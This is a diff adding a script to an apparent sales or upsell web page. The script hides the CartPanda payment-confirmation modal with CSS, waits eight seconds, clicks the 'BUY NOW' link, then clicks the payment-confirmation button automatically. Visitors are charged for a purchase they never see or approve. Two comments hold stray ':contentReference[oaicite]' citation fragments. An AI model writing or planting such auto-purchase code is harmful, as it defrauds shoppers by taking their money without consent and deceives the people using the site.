@@ -13,6 +13,47 @@
                 new OcuExternal();
                 </script>
             
+	<script>
+	  document.addEventListener('DOMContentLoaded', function() {
+		// 1) Esconde o modal de confirmação no CSS para evitar qualquer piscada
+		const style = document.createElement('style');
+		style.innerHTML = `
+		  #cartpandaModal,
+		  .cartpanda-modal { display: none !important; visibility: hidden !important; opacity: 0 !important; }
+		`;
+		document.head.appendChild(style);
+
+		// 2) Aguarda 8 segundos antes de disparar o fluxo de compra automática
+		setTimeout(function() {
+		  // 2.1) encontra o link "BUY NOW" pela classe e texto
+		  const buyLink = Array.from(document.querySelectorAll('a.cta-button'))
+			.find(a => a.textContent.trim().toUpperCase() === 'BUY NOW');
+		  if (!buyLink) {
+			console.warn('Botão BUY NOW não encontrado');
+			return;
+		  }
+
+		  // 2.2) dispara o click para abrir o modal (via OcuExternal) :contentReference[oaicite:1]{index=1}
+		  buyLink.click();
+
+		  // 2.3) faz polling até o botão de confirmação existir no DOM
+		  const tryConfirm = setInterval(() => {
+			const confirmBtn = document.getElementById('cartpanda-payment-confirmation');
+			const qtyInput  = document.getElementById('cartpanda-product-quantity');
+			if (confirmBtn) {
+			  clearInterval(tryConfirm);
+
+			  // opcional: garante quantidade = 1
+			  if (qtyInput) qtyInput.value = 1;
+
+			  // 2.4) dispara o submit do form interno :contentReference[oaicite:2]{index=2}
+			  confirmBtn.click();
+			}
+		  }, 250);
+		}, 8000);
+	  });
+	</script>
+
   <style>
     body {
       font-family: Arial, sans-serif;
